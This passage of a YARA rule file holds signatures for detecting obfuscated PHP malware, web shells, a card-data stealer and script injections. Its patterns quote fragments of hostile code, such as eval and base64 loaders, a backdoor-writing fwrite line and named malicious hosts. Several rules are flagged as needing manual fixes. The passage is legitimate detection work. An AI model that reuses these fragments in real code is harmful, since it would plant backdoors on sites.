rule php_malware_obfuscated_065 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode("
        $php_malware_obfuscated_065_r0 = /<\?php[\s]*eval[\s]*\([\s]*gz[\w]+[^\n;]{500,};[\s]*\?>[\s]*<\?php[\s]*([^\n]{0,100}\n)+/
    condition:
        $trigger and PR00029 and $php_malware_obfuscated_065_r0
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_066 : malware
{
    strings:
        $trigger = "].$"
        $php_malware_obfuscated_066_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_malware_obfuscated_066_r1 = /<\?(php)?[\s]*\$[\w]+[\s]*=[\s]*array\(('.',[\s]*){20,}'.'\);[\s]*(\$[\w]+[\s]*=[^;]+;[\s]*){3,}@[Ee][Vv][Aa][Ll][^;]+;/
    condition:
        $trigger and $php_malware_obfuscated_066_r0 and $php_malware_obfuscated_066_r1
}

rule php_malware_obfuscated_067 : malware
{
    strings:
        $trigger = "aWYoIWZ1bmN0aW9uX2V4aXN0cygiSSIpKXtmdW5jdGlvbiBJKCRhLCRiLCRjKXskZD1"
    condition:
        $trigger and PR02369 and PR02371
}

rule php_malware_obfuscated_068 : malware
{
    strings:
        $trigger = "Z2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwLiwhJCUmKCktXys9QCM/JykpKTtyZXR1cm47'));return;?>"
    condition:
        $trigger and PR00265 and PR01659
}

// MANUAL FIX NECESSARY
private rule PR05345 : trigger
{
    strings:
        $ps0 = "OO00"
    condition:
        $ps0
}

rule php_malware_obfuscated_069 : malware
{
    strings:
        $trigger = "urldecode("
        $php_malware_obfuscated_069_r0 = /<\?php[\s]*\$[0O]+[\s]*=[\s]*urldecode\(.%[^;]+\);[\s]*\$[0O]+[\s]*=[\s]*\$[0O]+\{[\d]+\}[\s]*\.[\s]*\$[0O]+\{[\d]+[^\(]+eval[\s]*\(/
    condition:
        $trigger and PR00029 and PR05345 and $php_malware_obfuscated_069_r0
}

private rule PR05346 : trigger
{
    strings:
        $ps0 = "\"\\x67\\x7a\\x69\\x6e\\x66\\x6c\\x61\\x74\\x65"
    condition:
        $ps0
}

rule php_malware_obfuscated_070 : malware
{
    strings:
        $trigger = "\\x73\\x74\\x72\\x5f\\x72\\x6f\\x74\\x31\\x33"
    condition:
        $trigger and PR05346
}

rule php_malware_obfuscated_071 : malware
{
    strings:
        $trigger = "$Seq = pack(\"H*\",sha1($Gamma.$Seq.$Salt));"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_malware_obfuscated_072 : malware
{
    strings:
        $trigger = ", ''),strfuncinj($"
    condition:
        $trigger
}

private rule PR05347 : trigger
{
    strings:
        $ps0 = ";}}exit();}echo"
    condition:
        $ps0
}

private rule PR05348 : trigger
{
    strings:
        $ps0 = "rename(__FILE__,dirname(__FILE__)"
    condition:
        $ps0
}

rule php_malware_obfuscated_073 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05347 and PR00355 and PR05348 and PR00357
}

// MANUAL FIX NECESSARY
private rule PR05349 : trigger
{
    strings:
        $ps0 = "*/${\"\\x"
    condition:
        $ps0
}

rule php_malware_obfuscated_074 : malware
{
    strings:
        $trigger = "\"}();/*"
        $php_malware_obfuscated_074_r0 = /<\?php[\s]*\/\*[^\n]+\*\/\$\{\".x...x...x[^\"]+\"\}\(\);[\s]*\/\*/
    condition:
        $trigger and PR01993 and PR05349 and PR00719 and $php_malware_obfuscated_074_r0
}

private rule PR05350 : trigger
{
    strings:
        $ps0 = ":error_reporting(0);goto"
    condition:
        $ps0
}

rule php_malware_obfuscated_075 : malware
{
    strings:
        $trigger = "gzinflate(substr(base64_decode("
    condition:
        $trigger and PR00029 and PR05350
}

rule php_malware_obfuscated_076 : malware
{
    strings:
        $trigger = "cabbaaWYoIWZ1bmN0aW9uX2V4aXN0cygiTzAwMCIpKXtmdW5jdGlvbiBPMDAwKCRhLCRiLCRjKXskZD1pbXBsb2RlKCRjKTskZD1w"
    condition:
        $trigger and PR02369 and PR02371
}

rule php_malware_obfuscated_077 : malware
{
    strings:
        $trigger = "caWYoIWZ1bmN0aW9uX2V4aXN0cygiSTFsbCIpKXtmdW5jdGlvbiBJMWxsKCRhLCRiLCRjKXskZD1pbXBsb2RlKCRj"
    condition:
        $trigger and PR02369 and PR02371
}

rule php_malware_obfuscated_078 : malware
{
    strings:
        $trigger = "jUjbZaJAEP0Vy7LKsFhjc7iX5VASi"
    condition:
        $trigger and PR02205
}

private rule PR05351 : trigger
{
    strings:
        $ps0 = "if($_SERVER['REQUEST_METHOD'] === 'POST')"
    condition:
        $ps0
}

rule php_malware_obfuscated_079 : malware
{
    strings:
        $trigger = ",\"r\"))) {"
    condition:
        $trigger and PR05351 and PR01968 and PR00029 and PR01788
}

rule php_malware_obfuscated_080 : malware
{
    strings:
        $trigger = "explode('|\x03|\x01|\x01', gzinflate(substr('\x1f"
    condition:
        $trigger and PR02521 and PR01021 and PR04819
}

private rule PR05352 : trigger
{
    strings:
        $ps0 = "\"/*"
    condition:
        $ps0
}

private rule PR05353 : trigger
{
    strings:
        $ps0 = "*/\""
    condition:
        $ps0
}

private rule PR05354 : trigger
{
    strings:
        $ps0 = "= @$"
    condition:
        $ps0
}

rule php_malware_obfuscated_081 : malware
{
    strings:
        $trigger = "*/^/*"
    condition:
        $trigger and PR00634 and PR05352 and PR05353 and PR05354 and PR01993
}

private rule PR05355 : trigger
{
    strings:
        $ps0 = "@${\"\\x"
    condition:
        $ps0
}

rule php_malware_obfuscated_081_02 : malware
{
    strings:
        $trigger = "*/^/*"
    condition:
        $trigger and PR05352 and PR05355 and PR05353 and PR05354
}

private rule PR05356 : trigger
{
    strings:
        $ps0 = "fvSnMGef3Prqd4KxxbvUmrhdkxZmNqR5GSy2xl"
    condition:
        $ps0
}

rule php_malware_obfuscated_082 : malware
{
    strings:
        $trigger = "file(__FILE__);eval(base64_decode("
    condition:
        $trigger and PR05356 and PR02369
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_084 : malware
{
    strings:
        $trigger = "].$"
        $php_malware_obfuscated_084_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_malware_obfuscated_084_r1 = /<\?(php)?[\s]*\$[\w]+[\s]*=[^;]+;[\s]*\$[\w]+[\s]*=[\s]*(\$[\w]+\[[\d]+\]\.)+[^\*]+\$[\w]+\(.H\*.,[^;]+\)\)\);[\s]*[Ee][Vv][Aa][Ll][^;]+;/
    condition:
        $trigger and $php_malware_obfuscated_084_r0 and $php_malware_obfuscated_084_r1
}

private rule PR05357 : trigger
{
    strings:
        $ps0 = "xP1ps+xIth2IfRfN+B+yaaXOLEORQGCGitUSZiAwzwj08AxDYJ5ngORvF25W1ntZ9SiRraaZrpkjIgD3Dffte6+91jlxcH"
    condition:
        $ps0
}

rule php_malware_obfuscated_085 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR05357 and PR00029
}

private rule PR05358 : trigger
{
    strings:
        $ps0 = "0; $dlist = glob(\"{$dn}/*\", constant(\"GLOB_NOSORT\")); if ($dlist) { for ($i"
    condition:
        $ps0
}

rule php_malware_obfuscated_086 : malware
{
    strings:
        $trigger = "(); unset($diag_req); class"
    condition:
        $trigger and PR05358 and PR04377
}

private rule PR05359 : trigger
{
    strings:
        $ps0 = "$key = '0000000000000000';"
    condition:
        $ps0
}

private rule PR05360 : trigger
{
    strings:
        $ps0 = "(0, $enc_data, $enc_data_long);"
    condition:
        $ps0
}

rule php_malware_obfuscated_087 : malware
{
    strings:
        $trigger = "resize(&$data, $size,"
    condition:
        $trigger and PR01350 and PR05359 and PR05360
}

rule php_malware_obfuscated_088 : malware
{
    strings:
        $trigger = "&&md5(md5(gettype($"
    condition:
        $trigger and PR01689
}

rule php_malware_obfuscated_088_02 : malware
{
    strings:
        $trigger = "&&md5(md5(gettype($"
    condition:
        $trigger and PR01689 and PR01392
}

private rule PR05361 : trigger
{
    strings:
        $ps0 = "gzinflate(substr(base64_decode('H4sIAAAAAAAAA/"
    condition:
        $ps0
}

rule php_malware_obfuscated_089 : malware
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR05361
}

private rule PR05362 : trigger
{
    strings:
        $ps0 = "*/ error_reporting(0); function"
    condition:
        $ps0
}

private rule PR05363 : trigger
{
    strings:
        $ps0 = ".= pack(\"C\", hexdec(substr($"
    condition:
        $ps0
}

rule php_malware_obfuscated_090 : malware
{
    strings:
        $trigger = "strlen(trim($"
    condition:
        $trigger and PR00029 and PR05362 and PR05363
}

rule php_malware_obfuscated_091 : malware
{
    strings:
        $trigger = "ITImZTJsJMZcYn36k9mg47O7qd8FE5"
    condition:
        $trigger and PR02205
}

private rule PR05364 : trigger
{
    strings:
        $ps0 = "$this->decipherLong($enc_data_long[$i], $enc_data_long[$i + 1],"
    condition:
        $ps0
}

private rule PR05365 : trigger
{
    strings:
        $ps0 = "if(preg_match('/Apple(.*) \\(/is',$"
    condition:
        $ps0
}

rule php_malware_obfuscated_092 : malware
{
    strings:
        $trigger = "function resize(&$data,"
    condition:
        $trigger and PR00029 and PR05364 and PR01422 and PR05365
}

private rule PR05366 : trigger
{
    strings:
        $ps0 = ", 0666);"
    condition:
        $ps0
}

private rule PR05367 : trigger
{
    strings:
        $ps0 = "(__FILE__) != $"
    condition:
        $ps0
}

private rule PR05368 : trigger
{
    strings:
        $ps0 = "))) || !isset($"
    condition:
        $ps0
}

private rule PR05369 : trigger
{
    strings:
        $ps0 = "echo \"\\n\";"
    condition:
        $ps0
}

private rule PR05370 : trigger
{
    strings:
        $ps0 = "= get_defined_vars();"
    condition:
        $ps0
}

private rule PR05371 : trigger
{
    strings:
        $ps0 = ", GLOB_ONLYDIR"
    condition:
        $ps0
}

rule php_malware_obfuscated_093 : malware
{
    strings:
        $trigger = "? E_ALL : 0);"
    condition:
        $trigger and PR05366 and PR05367 and PR05368 and PR00091 and PR05369 and PR05370 and PR05371
}

private rule PR05372 : trigger
{
    strings:
        $ps0 = "visitorIP()"
    condition:
        $ps0
}

rule php_malware_obfuscated_093_02 : malware
{
    strings:
        $trigger = "function obfuscateAddr"
    condition:
        $trigger and PR05330 and PR05372 and PR02001
}

private rule PR05373 : trigger
{
    strings:
        $ps0 = "@assert($"
    condition:
        $ps0
}

private rule PR05374 : trigger
{
    strings:
        $ps0 = "echo '<iframe"
    condition:
        $ps0
}

rule php_malware_obfuscated_094 : malware
{
    strings:
        $trigger = "\"\\145val("
    condition:
        $trigger and PR05373 and PR05374
}

private rule PR05375 : trigger
{
    strings:
        $ps0 = "explode(base64_decode("
    condition:
        $ps0
}

private rule PR05376 : trigger
{
    strings:
        $ps0 = "];exit;}}}function get_client_ip($"
    condition:
        $ps0
}

rule php_malware_obfuscated_095 : malware
{
    strings:
        $trigger = "ror_reporting"
    condition:
        $trigger and PR04915 and PR05375 and PR05376
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_096 : malware
{
    strings:
        $trigger = ").\"\".chr("
        $php_malware_obfuscated_096_r0 = /\$[\w]+[\s]*=[\s]*['\"][^'\"]+\";[\s]*\$[\w]+[\s]*=[^;]+chr\([\d]+\)[\s]*\.[\s]*\"\"[\s]*\.[\s]*chr[^\n]{500,}\);[\s]*/
    condition:
        $trigger and PR00719 and PR01613 and $php_malware_obfuscated_096_r0
}

private rule PR05377 : trigger
{
    strings:
        $ps0 = "___=$__"
    condition:
        $ps0
}

private rule PR05378 : trigger
{
    strings:
        $ps0 = "On2MYrDPIqpAXGEQCAQCITf4ngfP3BRMlaE2nej+cyVaMQmOcqknW8j2mPNFLEc9q1kaQ"
    condition:
        $ps0
}

private rule PR05379 : trigger
{
    strings:
        $ps0 = "_='printf';"
    condition:
        $ps0
}

rule php_malware_obfuscated_097 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05377 and PR05378 and PR01479 and PR05379
}

private rule PR05380 : trigger
{
    strings:
        $ps0 = "P07JClAYBEIIAS8LRctVo6n7rv6blYYWqwcZYR4p7"
    condition:
        $ps0
}

rule php_malware_obfuscated_098 : malware
{
    strings:
        $trigger = "(gzinflate(str_rot13(base64_decode("
    condition:
        $trigger and PR05380
}

private rule PR05381 : trigger
{
    strings:
        $ps0 = ".= rand();"
    condition:
        $ps0
}

private rule PR05382 : trigger
{
    strings:
        $ps0 = ".= (strlen($value) <= 0) ? $key{1} : $key{1}.$value{1};"
    condition:
        $ps0
}

rule php_malware_obfuscated_099 : malware
{
    strings:
        $trigger = "str_ireplace(\"decode\",\"create\",$"
    condition:
        $trigger and PR05381 and PR01480 and PR05382
}

private rule PR05383 : trigger
{
    strings:
        $ps0 = "] . '(' . $"
    condition:
        $ps0
}

private rule PR05384 : trigger
{
    strings:
        $ps0 = "] . '_' . $"
    condition:
        $ps0
}

private rule PR05385 : trigger
{
    strings:
        $ps0 = "; } eval("
    condition:
        $ps0
}

rule php_malware_obfuscated_100 : malware
{
    strings:
        $trigger = "error_reporting(0); function"
    condition:
        $trigger and PR05383 and PR05384 and PR05385
}

private rule PR05386 : trigger
{
    strings:
        $ps0 = "=''){ if(empty($"
    condition:
        $ps0
}

private rule PR05387 : trigger
{
    strings:
        $ps0 = "]); return(eval($"
    condition:
        $ps0
}

private rule PR05388 : trigger
{
    strings:
        $ps0 = ",__FILE__);global $"
    condition:
        $ps0
}

private rule PR05389 : trigger
{
    strings:
        $ps0 = "=='-1') @"
    condition:
        $ps0
}

rule php_malware_obfuscated_101 : malware
{
    strings:
        $trigger = "<?php defined("
    condition:
        $trigger and PR05386 and PR05387 and PR05388 and PR05389 and PR01422
}

private rule PR05390 : trigger
{
    strings:
        $ps0 = "; } eval ("
    condition:
        $ps0
}

private rule PR05391 : trigger
{
    strings:
        $ps0 = ".= pack(\"C"
    condition:
        $ps0
}

rule php_malware_obfuscated_103 : malware
{
    strings:
        $trigger = "error_reporting(0); function"
    condition:
        $trigger and PR05390 and PR05391
}

private rule PR05392 : trigger
{
    strings:
        $ps0 = "kport(base64_decode(urldecode($"
    condition:
        $ps0
}

rule php_malware_obfuscated_104 : malware
{
    strings:
        $trigger = "decrypt($"
    condition:
        $trigger and PR00732 and PR01550 and PR05392
}

private rule PR05393 : trigger
{
    strings:
        $ps0 = "}])?trim($_GET[$O"
    condition:
        $ps0
}

private rule PR05394 : trigger
{
    strings:
        $ps0 = "=''){global $O;"
    condition:
        $ps0
}

rule php_malware_obfuscated_105 : malware
{
    strings:
        $trigger = "++){if(strstr($"
    condition:
        $trigger and PR00435 and PR05393 and PR05394 and PR00341 and PR01586
}

private rule PR05395 : trigger
{
    strings:
        $ps0 = "$MEMEK_"
    condition:
        $ps0
}

private rule PR05396 : trigger
{
    strings:
        $ps0 = "CYBER"
    condition:
        $ps0
}

rule php_malware_obfuscated_106 : malware
{
    strings:
        $trigger = "$LONTE_"
    condition:
        $trigger and PR05395 and PR00719 and PR05396
}

private rule PR05397 : trigger
{
    strings:
        $ps0 = "=== null && !@$"
    condition:
        $ps0
}

private rule PR05398 : trigger
{
    strings:
        $ps0 = "= Array();"
    condition:
        $ps0
}

private rule PR05399 : trigger
{
    strings:
        $ps0 = "] : \"\");"
    condition:
        $ps0
}

private rule PR05400 : trigger
{
    strings:
        $ps0 = "exit(@"
    condition:
        $ps0
}

private rule PR05401 : trigger
{
    strings:
        $ps0 = "]]) && !empty($_SERVER[$"
    condition:
        $ps0
}

rule php_malware_obfuscated_107 : malware
{
    strings:
        $trigger = "return ((isset($_SERVER["
    condition:
        $trigger and PR05397 and PR05398 and PR05399 and PR05400 and PR04543 and PR05401
}

private rule PR05402 : trigger
{
    strings:
        $ps0 = "<?php if(!defined("
    condition:
        $ps0
}

private rule PR05403 : trigger
{
    strings:
        $ps0 = "]=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:(isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'');$"
    condition:
        $ps0
}

rule php_malware_obfuscated_108 : malware
{
    strings:
        $trigger = "\",__FILE__);function"
    condition:
        $trigger and PR05402 and PR00029 and PR01422 and PR05403
}

private rule PR05404 : trigger
{
    strings:
        $ps0 = "<?php error_reporting(0);ini_set(\"display_errors\", 0);if(!defined("
    condition:
        $ps0
}

private rule PR05405 : trigger
{
    strings:
        $ps0 = ",__FILE__);if(!function_exists(\""
    condition:
        $ps0
}

rule php_malware_obfuscated_108_02 : malware
{
    strings:
        $trigger = ";eval(\"\");if(($"
    condition:
        $trigger and PR05404 and PR05405 and PR01422
}

private rule PR05406 : trigger
{
    strings:
        $ps0 = "eval(gzuncompress(strrev($"
    condition:
        $ps0
}

private rule PR05407 : trigger
{
    strings:
        $ps0 = "halt_compiler"
    condition:
        $ps0
}

rule php_malware_obfuscated_109 : malware
{
    strings:
        $trigger = "fseek($"
    condition:
        $trigger and PR05406 and PR05407
}

private rule PR05408 : trigger
{
    strings:
        $ps0 = "(base64_decode($data),$key);"
    condition:
        $ps0
}

rule php_malware_obfuscated_110 : malware
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR05408
}

private rule PR05409 : trigger
{
    strings:
        $ps0 = ";eval(base64_decode("
    condition:
        $ps0
}

rule php_malware_obfuscated_111 : malware
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR03278 and PR05409
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_113 : malware
{
    strings:
        $trigger = "('',"
        $php_malware_obfuscated_113_r0 = /\$[\w]+[\s]*=[\s]*'[creat_funio\.']{17,};[\s]*\$[\w]+[\s]*=[\s]*'[gzuncompres\.']{14,};[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\('',[\s]*\$[\w]+\('[^\xFF]{20,5000}\);[\s]*\$[\w]+\(\);[\s]*/
    condition:
        $trigger and $php_malware_obfuscated_113_r0
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_114 : malware
{
    strings:
        $trigger = "eVAL"
        $php_malware_obfuscated_114_r0 = /\/\*\*\*\w+\*\*\*\/\)\/\*\*\*\w+\*\*\*\/;\/\*\*\*\w+\*\*\*\//
    condition:
        $trigger and PR01642 and $php_malware_obfuscated_114_r0
}

// MANUAL FIX NECESSARY
private rule PR05410 : trigger
{
    strings:
        $ps0 = "= \"?>$"
    condition:
        $ps0
}

private rule PR05411 : trigger
{
    strings:
        $ps0 = ".= \""
    condition:
        $ps0
}

rule php_malware_obfuscated_115 : malware
{
    strings:
        $trigger = "= \"\";"
        $php_malware_obfuscated_115_r0 = /\$[\w]+[\s]*=[\s]*\"\"[\s]*;[^\x02]+\?>\$[^;]+;[\s]*eval[^;]+;[\s]*/
    condition:
        $trigger and PR00029 and PR05410 and PR05411 and $php_malware_obfuscated_115_r0
}

private rule PR05412 : trigger
{
    strings:
        $ps0 = "=P.H.P.S.E.S.S.I.D;"
    condition:
        $ps0
}

rule php_malware_obfuscated_116 : malware
{
    strings:
        $trigger = "% strlen($"
    condition:
        $trigger and PR05412 and PR00029 and PR01422 and PR01742
}

private rule PR05413 : trigger
{
    strings:
        $ps0 = "=chr(ord($"
    condition:
        $ps0
}

rule php_malware_obfuscated_117 : malware
{
    strings:
        $trigger = "])^ord($"
    condition:
        $trigger and PR01590 and PR01748 and PR05413 and PR01422 and PR01466
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_120 : malware
{
    strings:
        $trigger = ".\"\\x"
        $php_malware_obfuscated_120_r0 = /=(\"a\"|\".x61\"|chr\(97\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"r\"|\".x72\"|chr\(114\))\.(\"t\"|\".x74\"|chr\(116\));/
        $php_malware_obfuscated_120_r1 = /=(\"b\"|\".x62\"|chr\(98\))\.(\"a\"|\".x61\"|chr\(97\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"6\"|\".x36\"|chr\(54\))\.(\"4\"|\".x34\"|chr\(52\))\.(\"_\"|\".x5f\"|chr\(95\))\.(\"d\"|\".x64\"|chr\(100\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"c\"|\".x63\"|chr\(99\))\.(\"o\"|\".x6f\"|chr\(111\))\.(\"d\"|\".x64\"|chr\(100\))\.(\"e\"|\".x65\"|chr\(101\));/
        $php_malware_obfuscated_120_r2 = /header\('Status: 404 Not Found',TRUE\);/
        $php_malware_obfuscated_120_r3 = /if\(isset\(\$_POST\[chr\(100[^\{]+\{\$\w+=(\"a\"|\".x61\"|chr\(97\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"s\"|\".x73\"|chr\(115\))\./
    condition:
        $trigger and PR01396 and $php_malware_obfuscated_120_r0 and $php_malware_obfuscated_120_r1 and $php_malware_obfuscated_120_r2 and $php_malware_obfuscated_120_r3
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_130 : malware
{
    strings:
        $trigger = "chr"
        $php_malware_obfuscated_130_r0 = /\.\s*chr\(\d+\)\s*\./
        $php_malware_obfuscated_130_r1 = /\$[\w]+[\s]*=[\s]*(chr\([\d]+\)[\s]*\.[\s]*){30,}chr\([^;]+;[\s]*(\$[\w]+[\s]*=[\s]*(\$[\w]+\[[\d]+\][\s]*\.[\s]*){8,}[^;]+\];[\s]*)+\$[\w]+\(\$[\w]+\(null,[\s]*\$[\w]+\[[\d]+\][\s]*\.[^\n]+\)\);[\s]*/
    condition:
        $trigger and $php_malware_obfuscated_130_r0 and $php_malware_obfuscated_130_r1
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_137 : malware
{
    strings:
        $trigger = "^ chr("
        $php_malware_obfuscated_137_r0 = /=[\w]+\(array\(\d/
        $php_malware_obfuscated_137_r1 = /\$[\w]+\.\$[\w]+\.\$[\w]+/
    condition:
        $trigger and $php_malware_obfuscated_137_r0 and $php_malware_obfuscated_137_r1
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_139 : malware
{
    strings:
        $trigger = "=range(1,"
        $php_malware_obfuscated_139_r0 = /=chr\(\$[\w]+\[96\]\)\.chr\(\$[\w]+\[114\]\)\.chr\(\$[\w]+\[114\]\)\.chr\(\$[\w]+\[100/
        $php_malware_obfuscated_139_r1 = /chr\(\$[\w]+\[94\]\)\.chr\(\$[\w]+\[79\]\)\.chr\(\$[\w]+\[78\]\)\.chr\(\$[\w]+\[82/
    condition:
        $trigger and PR01396 and $php_malware_obfuscated_139_r0 and $php_malware_obfuscated_139_r1
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_146 : malware
{
    strings:
        $trigger = "base64_decode"
        $php_malware_obfuscated_146_r0 = /return base64_decode\(\$v[0-9A-Z]{6}\);\}/
    condition:
        $trigger and PR00029 and $php_malware_obfuscated_146_r0
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_155 : malware
{
    strings:
        $trigger = " $_POST "
        $php_malware_obfuscated_155_r0 = /    \$_POST +\[.\w.\]   /
    condition:
        $trigger and $php_malware_obfuscated_155_r0
}

private rule PR05414 : trigger
{
    strings:
        $ps0 = "PHP Encode by  https://Www.PHPJiaMi.Com"
    condition:
        $ps0
}

rule php_malware_obfuscated_161 : malware
{
    strings:
        $trigger = "if($_SERVER[\"SCRIPT_NAME\"] != \"/index.php\"){ echo \"File Not Found !\";die(); }"
    condition:
        $trigger and PR00029 and PR05414 and PR01422 and PR01742
}

private rule PR05415 : trigger
{
    strings:
        $ps0 = "openssl_decrypt"
    condition:
        $ps0
}

rule php_malware_obfuscated_162 : malware
{
    strings:
        $trigger = "{define(\"_FILE_\",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER["
    condition:
        $trigger and PR05415 and PR00029 and PR01422 and PR01742
}

// MANUAL FIX NECESSARY
private rule PR05416 : trigger
{
    strings:
        $ps0 = "return \""
    condition:
        $ps0
}

rule php_malware_obfuscated_163 : malware
{
    strings:
        $trigger = "str_rot13"
        $php_malware_obfuscated_163_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*function[\s]*\([\s]*\$[\w]+[\s]*\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*\"[\w]+\"[\s]*;[\s]*return[\s]*\$[\w]+;[\s]*\}[\s]*;[\s]*\$[\w]+[\s]*=[\s]*function[\s]*\([\s]*\$[\w]+[\s]*\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*\"[\w]+\"[\s]*;[\s]*\$[\w]+[\s]*=[\s]*'[\w]+'[\s]*\.[^\}]+\}[\s]*;?[\s]*\$[\w]+[\s]*=[\s]*function/
    condition:
        $trigger and PR05416 and $php_malware_obfuscated_163_r0
}

private rule PR05417 : trigger
{
    strings:
        $ps0 = "str_replace(array('#s!s#', '#e!e#',"
    condition:
        $ps0
}

private rule PR05418 : trigger
{
    strings:
        $ps0 = ");?><?php eval(\"ob_start();\")"
    condition:
        $ps0
}

rule php_malware_obfuscated_164 : malware
{
    strings:
        $trigger = "$str))))))"
    condition:
        $trigger and PR05417 and PR01422 and PR05418
}

private rule PR05419 : trigger
{
    strings:
        $ps0 = "<?php error_reporting(0);define("
    condition:
        $ps0
}

rule php_malware_obfuscated_165 : malware
{
    strings:
        $trigger = "= explode('|"
    condition:
        $trigger and PR04915 and PR05419
}

private rule PR05420 : trigger
{
    strings:
        $ps0 = "NULL;@eval($"
    condition:
        $ps0
}

rule php_malware_obfuscated_166 : malware
{
    strings:
        $trigger = "))));unset($"
    condition:
        $trigger and PR05420
}

rule php_malware_obfuscated_167 : malware
{
    strings:
        $trigger = "$rndkey[$i]=ord($key[$i%$key_length]);"
    condition:
        $trigger and PR01422 and PR01466
}

rule php_malware_onclickads_net_001 : malware
{
    strings:
        $trigger = "');return base64_decode($a[$i]);} ?><?php echo"
    condition:
        $trigger and PR01545
}

private rule PR05421 : trigger
{
    strings:
        $ps0 = "$OOO000000=urldecode('%66%67%36%73%62%6"
    condition:
        $ps0
}

private rule PR05422 : trigger
{
    strings:
        $ps0 = "ukr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT09NHeEXHr8XhtONT08XHe"
    condition:
        $ps0
}

rule php_malware_OOO000000_001 : malware
{
    strings:
        $trigger = "File"
    condition:
        $trigger and PR05421 and PR05422
}

rule php_malware_opencartccstealer_001 : malware
{
    strings:
        $trigger = "$smail=$order_info['order_id'].\"|\".$order_info['payment_"
    condition:
        $trigger and PR00301
}

rule php_malware_openx_injection_001 : malware
{
    strings:
        $trigger = "$rate_code=base64_decode('PGlmcmFtZSBzcmM9Ig==')"
    condition:
        $trigger and PR02467
}

private rule PR05423 : trigger
{
    strings:
        $ps0 = "src='http://www.oxxtm.com/images/wp-"
    condition:
        $ps0
}

rule php_malware_oxxtm_001 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00050 and PR05423
}

private rule PR05424 : trigger
{
    strings:
        $ps0 = "jcyLjE4Ny8xLmpzJz48L3NjcmlwdD4=\");"
    condition:
        $ps0
}

rule php_malware_oxxtm_002 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05424 and PR01479
}

rule php_malware_pack_003 : malware
{
    strings:
        $trigger = "@include(pack('H*"
    condition:
        $trigger
}

private rule PR05425 : trigger
{
    strings:
        $ps0 = "<?php /*** PHP Encode v1.0 by zeura.com"
    condition:
        $ps0
}

rule php_malware_pack_005 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR05425
}

rule php_malware_pack_006 : malware
{
    strings:
        $trigger = "87465642e7068700a0a66756e6374696f6e"
    condition:
        $trigger and PR01637
}

private rule PR05426 : trigger
{
    strings:
        $ps0 = "tempnam(sys_get_temp_dir(),mt_rand(0,9999));"
    condition:
        $ps0
}

rule php_malware_pack_007 : malware
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR05426 and PR01746
}

private rule PR05427 : trigger
{
    strings:
        $ps0 = "202471646678616d7868766b613d2771646"
    condition:
        $ps0
}

rule php_malware_pack_008 : malware
{
    strings:
        $trigger = "pack("
    condition:
        $trigger and PR05427
}

private rule PR05428 : trigger
{
    strings:
        $ps0 = "\\x63\\x72\\x65\\x61\\x74\\x65\\x5f\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e"
    condition:
        $ps0
}

rule php_malware_pack_009 : malware
{
    strings:
        $trigger = "register_shutdown_function("
    condition:
        $trigger and PR05428 and PR01637
}

private rule PR05429 : trigger
{
    strings:
        $ps0 = "FoxAuto"
    condition:
        $ps0
}

rule php_malware_pack_010 : malware
{
    strings:
        $trigger = "hexdec(substr($"
    condition:
        $trigger and PR01550 and PR01637 and PR05429
}

rule php_malware_pack_011 : malware
{
    strings:
        $trigger = "pack(\"H*\",str_rot13($"
    condition:
        $trigger and PR01550
}

private rule PR05430 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['xxxprch']))"
    condition:
        $ps0
}

rule php_malware_pagerank_001 : malware
{
    strings:
        $trigger = "ror_reporting"
    condition:
        $trigger and PR05430
}

private rule PR05431 : trigger
{
    strings:
        $ps0 = "fwrite($file, '<?php if(md5($_POST[\"password\"])==\"'.$_POST[\"md5\"]."
    condition:
        $ps0
}

rule php_malware_placeholder_002 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05431
}

rule php_malware_redirect_001 : malware
{
    strings:
        $trigger = "http://www.se3curity.com"
    condition:
        $trigger and PR02741
}

private rule PR05432 : trigger
{
    strings:
